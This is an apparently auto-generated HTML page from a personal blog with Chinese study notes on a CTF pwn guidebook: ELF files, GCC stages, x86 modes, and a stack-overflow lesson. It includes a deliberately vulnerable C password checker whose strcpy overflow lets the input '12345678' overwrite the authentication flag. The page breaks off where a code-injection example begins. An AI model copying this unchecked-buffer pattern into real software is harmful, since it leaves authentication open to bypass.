@@ -1,0 +1,634 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8" />
+  <meta name="generator" content="Hugo 0.140.1">
+
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="author" content="" />
+  <meta property="og:url" content="http://localhost:1313/posts/ctfpwn/" />
+  <link rel="canonical" href="http://localhost:1313/posts/ctfpwn/" /><link rel="alternate" type="application/atom+xml" href="http://localhost:1313/index.xml" title="Shredder&#39;s Blog">
+
+  <script type="application/ld+json">
+  {
+      "@context" : "http://schema.org",
+      "@type" : "BlogPosting",
+      "mainEntityOfPage": {
+           "@type": "WebPage",
+           "@id": "http:\/\/localhost:1313\/"
+      },
+      "articleSection" : "posts",
+      "name" : "【零碎技术】CTF竞赛权威指南PWN",
+      "headline" : "【零碎技术】CTF竞赛权威指南PWN",
+      "description" : "书籍 第一章 CTF：Capture The Flag 竞赛模式：解题模式（RE逆向工程、Pwn漏洞挖掘与利用、Web渗透、Crypto密码学、Mobile移动安全、Misc杂项） 、攻防模式、混合模式 著名赛事：DEFCON CTF、Pwn2Own、CGC、XCTF、强网杯、HITCON CTF、TCTF 网络安全会议：RSA、BlackHat、ISC 学术会议：CCS、NDSS、Oakland S\u0026amp;P(A)、USENIX(A)\n第二章 编译器的结构可分为前端和后端，前端是机器无关的，其功能是把源程序分解成组成要素和相应的语法结构，通过这个结构创建源程序的中间表示，同时搜集和源程序相关的信息，存放到符号表中；后端是及其相关的，其功能是根据中间表示和符号表信息构造目标程序。 GCC的编译主要分为四个阶段：预处理（-E）、编译（-S）、汇编（-c）、链接。 ELF(Executable and Linkable Format)格式是COFF格式的变种。 ELF文件分为三种类型：可执行文件（.EXEC）、可重定位文件（.REL）和共享目标文件（.DYN）； 通常目标文件都会包含代码（.text）、数据（.data）和BSS（.bss）三个节，BSS节用于保存未初始化的全局变量和局部静态变量。\n第三章 最先诞生的是复杂指令集计算机（CISC），典型代表就是x86处理器。 对于x86处理器而言，有三个最主要的操作模式：保护模式、实地址模式和系统管理模式,此外还有一个保护模式的子模式，称为虚拟8086模式。 x86汇编语言主要的语法风格有两种：AT\u0026amp;T风格和Intel风格。\n第四章 第五章 视频 漏洞分析与利用 漏洞是bug的一种。 \/\/栈溢出-临近变量淹没 #include\u0026lt;stdio.h\u0026gt; #include\u0026lt;string.h\u0026gt; #define PASSWORD \u0026#34;1234567\u0026#34; int verify_password(char* password) { int authenticated; char buffer[8]; authenticated = strcmp(password, PASSWORD); strcpy(buffer, password); \/\/输入 12345678 ，覆盖authenticated的值，返回0 return authenticated; } int main() { int valid_flag = 0; char password[1024]; while (1) { printf(\u0026#34;input:\u0026#34;); scanf(\u0026#34;%s\u0026#34;,password); valid_flag = verify_password(password); if (valid_flag) { printf(\u0026#34;error\\n\u0026#34;); } else { printf(\u0026#34;right\\n\u0026#34;); } } return 0; } 栈溢出-返回地址覆盖\n",
+      "inLanguage" : "en-US",
+      "author" : "",
+      "creator" : "",
+      "publisher": "",
+      "accountablePerson" : "",
+      "copyrightHolder" : "",
+      "copyrightYear" : "2024",
+      "datePublished": "2024-11-25 12:08:25 \u002b0000 UTC",
+      "dateModified" : "2024-11-25 12:08:25 \u002b0000 UTC",
+      "url" : "http:\/\/localhost:1313\/posts\/ctfpwn\/",
+      "keywords" : [  ]
+  }
+</script>
+<title>【零碎技术】CTF竞赛权威指南PWN</title>
+  <meta property="og:title" content="【零碎技术】CTF竞赛权威指南PWN" />
+  <meta property="og:type" content="article" />
+  <meta property="og:description" content="书籍 第一章 CTF：Capture The Flag 竞赛模式：解题模式（RE逆向工程、Pwn漏洞挖掘与利用、Web渗透、Crypto密码学、Mobile移动安全、Misc杂项） 、攻防模式、混合模式 著名赛事：DEFCON CTF、Pwn2Own、CGC、XCTF、强网杯、HITCON CTF、TCTF 网络安全会议：RSA、BlackHat、ISC 学术会议：CCS、NDSS、Oakland S&amp;P(A)、USENIX(A)
+第二章 编译器的结构可分为前端和后端，前端是机器无关的，其功能是把源程序分解成组成要素和相应的语法结构，通过这个结构创建源程序的中间表示，同时搜集和源程序相关的信息，存放到符号表中；后端是及其相关的，其功能是根据中间表示和符号表信息构造目标程序。 GCC的编译主要分为四个阶段：预处理（-E）、编译（-S）、汇编（-c）、链接。 ELF(Executable and Linkable Format)格式是COFF格式的变种。 ELF文件分为三种类型：可执行文件（.EXEC）、可重定位文件（.REL）和共享目标文件（.DYN）； 通常目标文件都会包含代码（.text）、数据（.data）和BSS（.bss）三个节，BSS节用于保存未初始化的全局变量和局部静态变量。
+第三章 最先诞生的是复杂指令集计算机（CISC），典型代表就是x86处理器。 对于x86处理器而言，有三个最主要的操作模式：保护模式、实地址模式和系统管理模式,此外还有一个保护模式的子模式，称为虚拟8086模式。 x86汇编语言主要的语法风格有两种：AT&amp;T风格和Intel风格。
+第四章 第五章 视频 漏洞分析与利用 漏洞是bug的一种。 //栈溢出-临近变量淹没 #include&lt;stdio.h&gt; #include&lt;string.h&gt; #define PASSWORD &#34;1234567&#34; int verify_password(char* password) { int authenticated; char buffer[8]; authenticated = strcmp(password, PASSWORD); strcpy(buffer, password); //输入 12345678 ，覆盖authenticated的值，返回0 return authenticated; } int main() { int valid_flag = 0; char password[1024]; while (1) { printf(&#34;input:&#34;); scanf(&#34;%s&#34;,password); valid_flag = verify_password(password); if (valid_flag) { printf(&#34;error\n&#34;); } else { printf(&#34;right\n&#34;); } } return 0; } 栈溢出-返回地址覆盖
+" />
+  <meta name="description" content="书籍 第一章 CTF：Capture The Flag 竞赛模式：解题模式（RE逆向工程、Pwn漏洞挖掘与利用、Web渗透、Crypto密码学、Mobile移动安全、Misc杂项） 、攻防模式、混合模式 著名赛事：DEFCON CTF、Pwn2Own、CGC、XCTF、强网杯、HITCON CTF、TCTF 网络安全会议：RSA、BlackHat、ISC 学术会议：CCS、NDSS、Oakland S&amp;P(A)、USENIX(A)
+第二章 编译器的结构可分为前端和后端，前端是机器无关的，其功能是把源程序分解成组成要素和相应的语法结构，通过这个结构创建源程序的中间表示，同时搜集和源程序相关的信息，存放到符号表中；后端是及其相关的，其功能是根据中间表示和符号表信息构造目标程序。 GCC的编译主要分为四个阶段：预处理（-E）、编译（-S）、汇编（-c）、链接。 ELF(Executable and Linkable Format)格式是COFF格式的变种。 ELF文件分为三种类型：可执行文件（.EXEC）、可重定位文件（.REL）和共享目标文件（.DYN）； 通常目标文件都会包含代码（.text）、数据（.data）和BSS（.bss）三个节，BSS节用于保存未初始化的全局变量和局部静态变量。
+第三章 最先诞生的是复杂指令集计算机（CISC），典型代表就是x86处理器。 对于x86处理器而言，有三个最主要的操作模式：保护模式、实地址模式和系统管理模式,此外还有一个保护模式的子模式，称为虚拟8086模式。 x86汇编语言主要的语法风格有两种：AT&amp;T风格和Intel风格。
+第四章 第五章 视频 漏洞分析与利用 漏洞是bug的一种。 //栈溢出-临近变量淹没 #include&lt;stdio.h&gt; #include&lt;string.h&gt; #define PASSWORD &#34;1234567&#34; int verify_password(char* password) { int authenticated; char buffer[8]; authenticated = strcmp(password, PASSWORD); strcpy(buffer, password); //输入 12345678 ，覆盖authenticated的值，返回0 return authenticated; } int main() { int valid_flag = 0; char password[1024]; while (1) { printf(&#34;input:&#34;); scanf(&#34;%s&#34;,password); valid_flag = verify_password(password); if (valid_flag) { printf(&#34;error\n&#34;); } else { printf(&#34;right\n&#34;); } } return 0; } 栈溢出-返回地址覆盖
+" />
+  <meta property="og:locale" content="cn" /><meta property="og:image" content="" />
+  
+
+  
+    <style>body{font-family:bree serif,sans-serif;-webkit-font-smoothing:antialiased;margin:0 20px}article{max-width:800px;margin-left:auto;margin-right:auto}a{color:#000;text-decoration:none}a:hover{font-weight:600;text-decoration:underline}.post-ads{margin:50px 0}.markdown-body{font-size:18px;max-width:100%}.markdown-body a{text-decoration:underline;text-decoration-color:#000}.markdown-body blockquote{margin:0;padding:0 1em;color:#57606a;border-left:.25em solid #d0d7de}.markdown-body pre{padding:16px;overflow:auto;border-radius:10px}.markdown-body code{padding:.2em .4em;font-size:85%;background-color:#f6f8fa;border-radius:6px}.markdown-body pre>code{padding:0;font-size:100%;background-color:inherit;border:0}.Chinese .markdown-body{line-height:200%}.site-date-catalog{font-size:2rem}.header-title{font-size:2rem;font-weight:700;margin-top:32px;font-family:bungee shade,sans-serif}.header-title a{text-decoration:none}.header-subtitle{color:#666}.header-items{margin:10px 0}.header-item{margin:0 5px}.header-line{width:100%;border-width:2px;border-color:#482936;border-style:solid none none none}.lang-switch{font-weight:600}#posts-list{min-height:600px}.posts-line{font-size:1.2rem;margin:12px 0}.posts-categories{font-size:.8rem;margin:auto;text-align:center}.posts-category{padding:3px 0;border:#000 2px solid;border-radius:5px}.site-footer{margin-top:50px}.site-footer-item{margin-right:12px}.post-header{margin-bottom:50px}.post-title{font-size:2rem;font-weight:600}.post-tags{display:inline;font-weight:600;padding:2px 5px;margin-right:6px;border:#000 2px solid;border-radius:5px}.post-date{font-weight:800;font-style:italic}.post-author{float:right;font-weight:600}.page-content{min-height:60%}.post-content{margin-bottom:50px}.post-content p{hyphens:auto;line-height:1.8;text-justify:ideographic;margin-bottom:1em}.post-content img{max-width:100%;display:block;margin-right:auto;margin-top:6px}.post-content .post-gallery{display:flex;flex-wrap:wrap;gap:6px}.post-content .post-gallery img{margin-right:auto;margin-top:auto;width:calc(50% - 3px)}.related-content{border-width:3px;border-style:solid;border-color:#000;padding:0 10px;margin-bottom:50px;margin-top:100px}.related-content li{margin:5px 0}.taxonomy-term{font-size:3rem}.gallery-img{text-align:center}.gallery-img span{text-align:center}.gallery-img-desc{font-size:.8em;font-weight:800}#disqus_thread{position:relative}#disqus_thread:after{content:"";display:block;height:55px;width:100%;position:absolute;bottom:0;background:#fff}@media screen and (max-width:600px){.header-title,.header-subtitle,.header-items{}.posts-line{font-size:16px}.markdown-body{font-size:16px}.post-title{font-size:2rem}.post-content p{letter-spacing:.05em}.post-content .post-gallery img{width:100%}}@media screen and (max-width:48em){.posts-category{display:none}}</style>
+  
+  
+    <style>.container,.container-fluid{margin-right:auto;margin-left:auto}.container-fluid{padding-right:2rem;padding-left:2rem}.row{box-sizing:border-box;display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-flex:0;-ms-flex:0 1 auto;flex:initial;-webkit-box-orient:horizontal;-webkit-box-direction:normal;-ms-flex-direction:row;flex-direction:row;-ms-flex-wrap:wrap;flex-wrap:wrap;margin-right:-.5rem;margin-left:-.5rem}.row.reverse{-webkit-box-orient:horizontal;-webkit-box-direction:reverse;-ms-flex-direction:row-reverse;flex-direction:row-reverse}.col.reverse{-webkit-box-orient:vertical;-webkit-box-direction:reverse;-ms-flex-direction:column-reverse;flex-direction:column-reverse}.col-xs,.col-xs-1,.col-xs-10,.col-xs-11,.col-xs-12,.col-xs-2,.col-xs-3,.col-xs-4,.col-xs-5,.col-xs-6,.col-xs-7,.col-xs-8,.col-xs-9,.col-xs-offset-0,.col-xs-offset-1,.col-xs-offset-10,.col-xs-offset-11,.col-xs-offset-12,.col-xs-offset-2,.col-xs-offset-3,.col-xs-offset-4,.col-xs-offset-5,.col-xs-offset-6,.col-xs-offset-7,.col-xs-offset-8,.col-xs-offset-9{box-sizing:border-box;-webkit-box-flex:0;-ms-flex:0 0 auto;flex:none;padding-right:.5rem;padding-left:.5rem}.col-xs{-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;-ms-flex-preferred-size:0;flex-basis:0;max-width:100%}.col-xs-1{-ms-flex-preferred-size:8.33333333%;flex-basis:8.33333333%;max-width:8.33333333%}.col-xs-2{-ms-flex-preferred-size:16.66666667%;flex-basis:16.66666667%;max-width:16.66666667%}.col-xs-3{-ms-flex-preferred-size:25%;flex-basis:25%;max-width:25%}.col-xs-4{-ms-flex-preferred-size:33.33333333%;flex-basis:33.33333333%;max-width:33.33333333%}.col-xs-5{-ms-flex-preferred-size:41.66666667%;flex-basis:41.66666667%;max-width:41.66666667%}.col-xs-6{-ms-flex-preferred-size:50%;flex-basis:50%;max-width:50%}.col-xs-7{-ms-flex-preferred-size:58.33333333%;flex-basis:58.33333333%;max-width:58.33333333%}.col-xs-8{-ms-flex-preferred-size:66.66666667%;flex-basis:66.66666667%;max-width:66.66666667%}.col-xs-9{-ms-flex-preferred-size:75%;flex-basis:75%;max-width:75%}.col-xs-10{-ms-flex-preferred-size:83.33333333%;flex-basis:83.33333333%;max-width:83.33333333%}.col-xs-11{-ms-flex-preferred-size:91.66666667%;flex-basis:91.66666667%;max-width:91.66666667%}.col-xs-12{-ms-flex-preferred-size:100%;flex-basis:100%;max-width:100%}.col-xs-offset-0{margin-left:0}.col-xs-offset-1{margin-left:8.33333333%}.col-xs-offset-2{margin-left:16.66666667%}.col-xs-offset-3{margin-left:25%}.col-xs-offset-4{margin-left:33.33333333%}.col-xs-offset-5{margin-left:41.66666667%}.col-xs-offset-6{margin-left:50%}.col-xs-offset-7{margin-left:58.33333333%}.col-xs-offset-8{margin-left:66.66666667%}.col-xs-offset-9{margin-left:75%}.col-xs-offset-10{margin-left:83.33333333%}.col-xs-offset-11{margin-left:91.66666667%}.start-xs{-webkit-box-pack:start;-ms-flex-pack:start;justify-content:flex-start;text-align:start}.center-xs{-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;text-align:center}.end-xs{-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end;text-align:end}.top-xs{-webkit-box-align:start;-ms-flex-align:start;align-items:flex-start}.middle-xs{-webkit-box-align:center;-ms-flex-align:center;align-items:center}.bottom-xs{-webkit-box-align:end;-ms-flex-align:end;align-items:flex-end}.around-xs{-ms-flex-pack:distribute;justify-content:space-around}.between-xs{-webkit-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between}.first-xs{-webkit-box-ordinal-group:0;-ms-flex-order:-1;order:-1}.last-xs{-webkit-box-ordinal-group:2;-ms-flex-order:1;order:1}@media only screen and (min-width:48em){.container{width:49rem}.col-sm,.col-sm-1,.col-sm-10,.col-sm-11,.col-sm-12,.col-sm-2,.col-sm-3,.col-sm-4,.col-sm-5,.col-sm-6,.col-sm-7,.col-sm-8,.col-sm-9,.col-sm-offset-0,.col-sm-offset-1,.col-sm-offset-10,.col-sm-offset-11,.col-sm-offset-12,.col-sm-offset-2,.col-sm-offset-3,.col-sm-offset-4,.col-sm-offset-5,.col-sm-offset-6,.col-sm-offset-7,.col-sm-offset-8,.col-sm-offset-9{box-sizing:border-box;-webkit-box-flex:0;-ms-flex:0 0 auto;flex:none;padding-right:.5rem;padding-left:.5rem}.col-sm{-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;-ms-flex-preferred-size:0;flex-basis:0;max-width:100%}.col-sm-1{-ms-flex-preferred-size:8.33333333%;flex-basis:8.33333333%;max-width:8.33333333%}.col-sm-2{-ms-flex-preferred-size:16.66666667%;flex-basis:16.66666667%;max-width:16.66666667%}.col-sm-3{-ms-flex-preferred-size:25%;flex-basis:25%;max-width:25%}.col-sm-4{-ms-flex-preferred-size:33.33333333%;flex-basis:33.33333333%;max-width:33.33333333%}.col-sm-5{-ms-flex-preferred-size:41.66666667%;flex-basis:41.66666667%;max-width:41.66666667%}.col-sm-6{-ms-flex-preferred-size:50%;flex-basis:50%;max-width:50%}.col-sm-7{-ms-flex-preferred-size:58.33333333%;flex-basis:58.33333333%;max-width:58.33333333%}.col-sm-8{-ms-flex-preferred-size:66.66666667%;flex-basis:66.66666667%;max-width:66.66666667%}.col-sm-9{-ms-flex-preferred-size:75%;flex-basis:75%;max-width:75%}.col-sm-10{-ms-flex-preferred-size:83.33333333%;flex-basis:83.33333333%;max-width:83.33333333%}.col-sm-11{-ms-flex-preferred-size:91.66666667%;flex-basis:91.66666667%;max-width:91.66666667%}.col-sm-12{-ms-flex-preferred-size:100%;flex-basis:100%;max-width:100%}.col-sm-offset-0{margin-left:0}.col-sm-offset-1{margin-left:8.33333333%}.col-sm-offset-2{margin-left:16.66666667%}.col-sm-offset-3{margin-left:25%}.col-sm-offset-4{margin-left:33.33333333%}.col-sm-offset-5{margin-left:41.66666667%}.col-sm-offset-6{margin-left:50%}.col-sm-offset-7{margin-left:58.33333333%}.col-sm-offset-8{margin-left:66.66666667%}.col-sm-offset-9{margin-left:75%}.col-sm-offset-10{margin-left:83.33333333%}.col-sm-offset-11{margin-left:91.66666667%}.start-sm{-webkit-box-pack:start;-ms-flex-pack:start;justify-content:flex-start;text-align:start}.center-sm{-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;text-align:center}.end-sm{-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end;text-align:end}.top-sm{-webkit-box-align:start;-ms-flex-align:start;align-items:flex-start}.middle-sm{-webkit-box-align:center;-ms-flex-align:center;align-items:center}.bottom-sm{-webkit-box-align:end;-ms-flex-align:end;align-items:flex-end}.around-sm{-ms-flex-pack:distribute;justify-content:space-around}.between-sm{-webkit-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between}.first-sm{-webkit-box-ordinal-group:0;-ms-flex-order:-1;order:-1}.last-sm{-webkit-box-ordinal-group:2;-ms-flex-order:1;order:1}}@media only screen and (min-width:64em){.container{width:65rem}.col-md,.col-md-1,.col-md-10,.col-md-11,.col-md-12,.col-md-2,.col-md-3,.col-md-4,.col-md-5,.col-md-6,.col-md-7,.col-md-8,.col-md-9,.col-md-offset-0,.col-md-offset-1,.col-md-offset-10,.col-md-offset-11,.col-md-offset-12,.col-md-offset-2,.col-md-offset-3,.col-md-offset-4,.col-md-offset-5,.col-md-offset-6,.col-md-offset-7,.col-md-offset-8,.col-md-offset-9{box-sizing:border-box;-webkit-box-flex:0;-ms-flex:0 0 auto;flex:none;padding-right:.5rem;padding-left:.5rem}.col-md{-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;-ms-flex-preferred-size:0;flex-basis:0;max-width:100%}.col-md-1{-ms-flex-preferred-size:8.33333333%;flex-basis:8.33333333%;max-width:8.33333333%}.col-md-2{-ms-flex-preferred-size:16.66666667%;flex-basis:16.66666667%;max-width:16.66666667%}.col-md-3{-ms-flex-preferred-size:25%;flex-basis:25%;max-width:25%}.col-md-4{-ms-flex-preferred-size:33.33333333%;flex-basis:33.33333333%;max-width:33.33333333%}.col-md-5{-ms-flex-preferred-size:41.66666667%;flex-basis:41.66666667%;max-width:41.66666667%}.col-md-6{-ms-flex-preferred-size:50%;flex-basis:50%;max-width:50%}.col-md-7{-ms-flex-preferred-size:58.33333333%;flex-basis:58.33333333%;max-width:58.33333333%}.col-md-8{-ms-flex-preferred-size:66.66666667%;flex-basis:66.66666667%;max-width:66.66666667%}.col-md-9{-ms-flex-preferred-size:75%;flex-basis:75%;max-width:75%}.col-md-10{-ms-flex-preferred-size:83.33333333%;flex-basis:83.33333333%;max-width:83.33333333%}.col-md-11{-ms-flex-preferred-size:91.66666667%;flex-basis:91.66666667%;max-width:91.66666667%}.col-md-12{-ms-flex-preferred-size:100%;flex-basis:100%;max-width:100%}.col-md-offset-0{margin-left:0}.col-md-offset-1{margin-left:8.33333333%}.col-md-offset-2{margin-left:16.66666667%}.col-md-offset-3{margin-left:25%}.col-md-offset-4{margin-left:33.33333333%}.col-md-offset-5{margin-left:41.66666667%}.col-md-offset-6{margin-left:50%}.col-md-offset-7{margin-left:58.33333333%}.col-md-offset-8{margin-left:66.66666667%}.col-md-offset-9{margin-left:75%}.col-md-offset-10{margin-left:83.33333333%}.col-md-offset-11{margin-left:91.66666667%}.start-md{-webkit-box-pack:start;-ms-flex-pack:start;justify-content:flex-start;text-align:start}.center-md{-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;text-align:center}.end-md{-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end;text-align:end}.top-md{-webkit-box-align:start;-ms-flex-align:start;align-items:flex-start}.middle-md{-webkit-box-align:center;-ms-flex-align:center;align-items:center}.bottom-md{-webkit-box-align:end;-ms-flex-align:end;align-items:flex-end}.around-md{-ms-flex-pack:distribute;justify-content:space-around}.between-md{-webkit-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between}.first-md{-webkit-box-ordinal-group:0;-ms-flex-order:-1;order:-1}.last-md{-webkit-box-ordinal-group:2;-ms-flex-order:1;order:1}}@media only screen and (min-width:75em){.container{width:76rem}.col-lg,.col-lg-1,.col-lg-10,.col-lg-11,.col-lg-12,.col-lg-2,.col-lg-3,.col-lg-4,.col-lg-5,.col-lg-6,.col-lg-7,.col-lg-8,.col-lg-9,.col-lg-offset-0,.col-lg-offset-1,.col-lg-offset-10,.col-lg-offset-11,.col-lg-offset-12,.col-lg-offset-2,.col-lg-offset-3,.col-lg-offset-4,.col-lg-offset-5,.col-lg-offset-6,.col-lg-offset-7,.col-lg-offset-8,.col-lg-offset-9{box-sizing:border-box;-webkit-box-flex:0;-ms-flex:0 0 auto;flex:none;padding-right:.5rem;padding-left:.5rem}.col-lg{-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;-ms-flex-preferred-size:0;flex-basis:0;max-width:100%}.col-lg-1{-ms-flex-preferred-size:8.33333333%;flex-basis:8.33333333%;max-width:8.33333333%}.col-lg-2{-ms-flex-preferred-size:16.66666667%;flex-basis:16.66666667%;max-width:16.66666667%}.col-lg-3{-ms-flex-preferred-size:25%;flex-basis:25%;max-width:25%}.col-lg-4{-ms-flex-preferred-size:33.33333333%;flex-basis:33.33333333%;max-width:33.33333333%}.col-lg-5{-ms-flex-preferred-size:41.66666667%;flex-basis:41.66666667%;max-width:41.66666667%}.col-lg-6{-ms-flex-preferred-size:50%;flex-basis:50%;max-width:50%}.col-lg-7{-ms-flex-preferred-size:58.33333333%;flex-basis:58.33333333%;max-width:58.33333333%}.col-lg-8{-ms-flex-preferred-size:66.66666667%;flex-basis:66.66666667%;max-width:66.66666667%}.col-lg-9{-ms-flex-preferred-size:75%;flex-basis:75%;max-width:75%}.col-lg-10{-ms-flex-preferred-size:83.33333333%;flex-basis:83.33333333%;max-width:83.33333333%}.col-lg-11{-ms-flex-preferred-size:91.66666667%;flex-basis:91.66666667%;max-width:91.66666667%}.col-lg-12{-ms-flex-preferred-size:100%;flex-basis:100%;max-width:100%}.col-lg-offset-0{margin-left:0}.col-lg-offset-1{margin-left:8.33333333%}.col-lg-offset-2{margin-left:16.66666667%}.col-lg-offset-3{margin-left:25%}.col-lg-offset-4{margin-left:33.33333333%}.col-lg-offset-5{margin-left:41.66666667%}.col-lg-offset-6{margin-left:50%}.col-lg-offset-7{margin-left:58.33333333%}.col-lg-offset-8{margin-left:66.66666667%}.col-lg-offset-9{margin-left:75%}.col-lg-offset-10{margin-left:83.33333333%}.col-lg-offset-11{margin-left:91.66666667%}.start-lg{-webkit-box-pack:start;-ms-flex-pack:start;justify-content:flex-start;text-align:start}.center-lg{-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;text-align:center}.end-lg{-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end;text-align:end}.top-lg{-webkit-box-align:start;-ms-flex-align:start;align-items:flex-start}.middle-lg{-webkit-box-align:center;-ms-flex-align:center;align-items:center}.bottom-lg{-webkit-box-align:end;-ms-flex-align:end;align-items:flex-end}.around-lg{-ms-flex-pack:distribute;justify-content:space-around}.between-lg{-webkit-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between}.first-lg{-webkit-box-ordinal-group:0;-ms-flex-order:-1;order:-1}.last-lg{-webkit-box-ordinal-group:2;-ms-flex-order:1;order:1}}</style>
+  
+
+  
+
+  <link href="/index.xml" rel="alternate" type="application/rss+xml"
+    title="Shredder&#39;s Blog">
+  
+  <link rel="preconnect" href="https://fonts.gstatic.com">
+  <link href="https://fonts.googleapis.com/css?family=Bree+Serif|Bungee+Shade" rel="stylesheet">
+  
+  
+
+  
+  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-xxx"></script>
+</head>
+
+
+<body>
+  <article class="post 中文" id="article">
+    <div class="row">
+      <div class="col-xs-12">
+        <div class="site-header">
+          
+<header>
+  <div class="header-title">
+    <a href="/"
+      >Shredder&#39;s Blog</a
+    >
+  </div>
+  <div class="header-subtitle"></div>
+</header>
+<div class="row end-md header-items">
+  
+  <div class="header-item">
+    <a href="https://github.com/Xoctye" target="_blank">Github</a>
+  </div>
+  
+</div>
+<div class="row">
+   
+</div>
+<div class="header-line"></div>
+
+        </div>
+        <header class="post-header">
+          <h1 class="post-title">【零碎技术】CTF竞赛权威指南PWN</h1>
+          
+          <div class="row post-desc">
+            <div class="col-xs-6">
+              
+              <time class="post-date" datetime="2024-11-25 12:08:25 UTC">
+                25 Nov 2024
+              </time>
+              
+            </div>
+            <div class="col-xs-6">
+              
+            </div>
+          </div>
+          
+        </header>
+
+        <div class="post-content markdown-body">
+          
+          <h1 id="书籍">书籍</h1>
+<h2 id="第一章">第一章</h2>
+<p>CTF：Capture The Flag
+竞赛模式：解题模式（RE逆向工程、Pwn漏洞挖掘与利用、Web渗透、Crypto密码学、Mobile移动安全、Misc杂项）
+、攻防模式、混合模式
+著名赛事：DEFCON CTF、Pwn2Own、CGC、XCTF、强网杯、HITCON CTF、TCTF
+网络安全会议：RSA、BlackHat、ISC
+学术会议：CCS、NDSS、Oakland S&amp;P(A)、USENIX(A)</p>
+<hr>
+<h2 id="第二章">第二章</h2>
+<p>编译器的结构可分为前端和后端，前端是机器无关的，其功能是把源程序分解成组成要素和相应的语法结构，通过这个结构创建源程序的中间表示，同时搜集和源程序相关的信息，存放到符号表中；后端是及其相关的，其功能是根据中间表示和符号表信息构造目标程序。
+GCC的编译主要分为四个阶段：预处理（-E）、编译（-S）、汇编（-c）、链接。
+ELF(Executable and Linkable Format)格式是COFF格式的变种。
+ELF文件分为三种类型：可执行文件（.EXEC）、可重定位文件（.REL）和共享目标文件（.DYN）；
+通常目标文件都会包含代码（.text）、数据（.data）和BSS（.bss）三个节，BSS节用于保存未初始化的全局变量和局部静态变量。</p>
+<hr>
+<h2 id="第三章">第三章</h2>
+<p>最先诞生的是复杂指令集计算机（CISC），典型代表就是x86处理器。
+对于x86处理器而言，有三个最主要的操作模式：保护模式、实地址模式和系统管理模式,此外还有一个保护模式的子模式，称为虚拟8086模式。
+x86汇编语言主要的语法风格有两种：AT&amp;T风格和Intel风格。</p>
+<hr>
+<h2 id="第四章">第四章</h2>
+<hr>
+<h2 id="第五章">第五章</h2>
+<hr>
+<h1 id="视频">视频</h1>
+<p><a href="https://www.bilibili.com/video/BV13cBXYqE2m">漏洞分析与利用</a>
+漏洞是bug的一种。
+<img src="/images/pwn0001.png" alt="">
+<img src="/images/pwn0002.png" alt=""></p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="font-style:italic">//栈溢出-临近变量淹没
+</span></span></span><span style="display:flex;"><span><span style="font-style:italic"></span><span style="">#include&lt;stdio.h&gt;
+</span></span></span><span style="display:flex;"><span><span style="">#include&lt;string.h&gt;
+</span></span></span><span style="display:flex;"><span><span style="">#define PASSWORD &#34;1234567&#34;
+</span></span></span><span style="display:flex;"><span><span style=""></span>
+</span></span><span style="display:flex;"><span><span style="">int</span> verify_password(<span style="">char</span>* password)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>        <span style="">int</span> authenticated;
+</span></span><span style="display:flex;"><span>        <span style="">char</span> buffer[8];
+</span></span><span style="display:flex;"><span>        authenticated = strcmp(password, PASSWORD);
+</span></span><span style="display:flex;"><span>        strcpy(buffer, password); <span style="font-style:italic">//输入 12345678 ，覆盖authenticated的值，返回0
+</span></span></span><span style="display:flex;"><span><span style="font-style:italic"></span>        <span style="font-weight:bold">return</span> authenticated;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="">int</span> main()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>        <span style="">int</span> valid_flag = 0;
+</span></span><span style="display:flex;"><span>        <span style="">char</span> password[1024];
+</span></span><span style="display:flex;"><span>        <span style="font-weight:bold">while</span> (1)
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>                printf(<span style="font-style:italic">&#34;input:&#34;</span>);
+</span></span><span style="display:flex;"><span>                scanf(<span style="font-style:italic">&#34;%s&#34;</span>,password);
+</span></span><span style="display:flex;"><span>                valid_flag = verify_password(password);
+</span></span><span style="display:flex;"><span>                <span style="font-weight:bold">if</span> (valid_flag)
+</span></span><span style="display:flex;"><span>                {
+</span></span><span style="display:flex;"><span>                        printf(<span style="font-style:italic">&#34;error</span><span style="font-weight:bold;font-style:italic">\n</span><span style="font-style:italic">&#34;</span>);
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>                <span style="font-weight:bold">else</span>
+</span></span><span style="display:flex;"><span>                {
+</span></span><span style="display:flex;"><span>                        printf(<span style="font-style:italic">&#34;right</span><span style="font-weight:bold;font-style:italic">\n</span><span style="font-style:italic">&#34;</span>);
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="font-weight:bold">return</span> 0;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>栈溢出-返回地址覆盖</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="font-style:italic">//栈溢出-手工代码植入
